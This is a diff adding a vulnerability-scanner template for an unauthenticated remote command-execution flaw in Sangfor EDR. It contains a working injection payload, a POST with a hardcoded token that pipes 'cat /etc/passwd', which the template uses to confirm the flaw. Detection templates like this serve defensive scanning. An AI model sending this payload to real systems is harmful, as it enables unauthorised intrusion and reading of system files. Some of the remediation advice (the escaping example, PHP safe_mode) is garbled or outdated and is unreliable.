@@ -1,0 +1,37 @@
+id: sangfor-edr-rce
+info:
+  name: Sangfor EDR 3.2.17R1/3.2.21 RCE
+  author:
+  - l0ne1y
+  description: |-
+    Sangfor EDR 3.2.21 Arbitrary Command Execution Vulnerability
+    A vulnerability in the Sangfor EDR product allows an unauthenticated remote user to cause the product to execute arbitrary commands.
+  severity: critical
+  remediation: |-
+    Official remediation advice:
+    1. Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+    https://www.sangfor.com.cn/product/
+
+    Temporary remediation advice:
+    1. Avoid executing external applications or commands whenever possible.
+    2. Implement the functionality of external applications or commands using custom functions or function libraries.
+    3. Validate parameter content before calling command-execution functions such as system and eval.
+    4. Use the escapeshellarg function to handle related parameters. escapeshellarg escapes any characters that would terminate a parameter or command; for example, a single quote ("'") is escaped to "\'", a double quote ("\"") is escaped to "\\\"", and a semicolon (";") is escaped to ";". This way escapeshellarg confines the parameter content within a pair of single or double quotes and escapes any single or double quotes contained in the parameter, preventing them from truncating the ongoing command and thereby mitigating command injection attacks.
+    5. Use safe_mode_exec_dir to specify the directory for executable files. Set safe_mode to On in php.ini, place allowed executables into a directory, and use safe_mode_exec_dir to designate this executable directory. When an external program needs to be executed, it will only run if located in the directory specified by safe_mode_exec_dir; otherwise execution will fail.
+requests:
+- matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9'
+  method: POST
+  body: |
+    {"params":"w=123\"'1234123'\"|cat /etc/passwd"}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
